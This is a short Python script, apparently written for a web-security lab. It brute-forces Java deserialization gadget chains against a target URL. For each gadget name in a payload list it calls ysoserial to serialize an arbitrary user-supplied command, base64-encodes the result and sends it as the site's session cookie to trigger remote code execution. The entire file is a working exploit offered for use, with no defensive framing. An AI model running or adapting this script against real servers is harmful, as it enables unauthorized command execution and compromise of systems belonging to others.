import requests
import argparse
import os
import urllib.parse
import re

def input_func():
    parser = argparse.ArgumentParser(description='Reading the input')
    parser.add_argument('-u', type=str, default=None, metavar='url', help='The url we will investigate')
    parser.add_argument('-p', type=str, default=None, metavar='payloads', help='The payloads we will use')
    parser.add_argument('-c', type=str, default=None, metavar='command', help='The command we will use')
    args = parser.parse_args()
    return args.u, args.p, args.c

def create_cookie(payload, command):
    os.system(f"PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ~/Downloads/ysoserial-all.jar {payload} '{command}' | base64 > cookie_base64.txt")
    with open('cookie_base64.txt') as f:
        lines = f.read()
    cookie = lines.strip()
    return urllib.parse.quote(cookie)

def send_cookie(url, cookie):
    pattern = r"https://([^/]+)"
    match = re.search(pattern, url)
    domain = match.group(1)
    headers = {
        "Host": "{}".format(domain),
        "Cookie": "session={}".format(cookie)
    }

    response = requests.get(url, headers=headers)

    return response

if __name__ == '__main__':

    # sudo apt-get install openjdk-11-jdk

    url, payloads, command = input_func()
    if url is None:
        print('Please enter an url!')
    elif payloads is None:
        print('Please enter payloads!')
    elif command is None:
        print('Please enter a command!')

    with open(payloads) as f:
        lines = f.readlines()
    for payload in lines:
        cookie = create_cookie(payload.strip(), command)
        response = send_cookie(url, cookie)
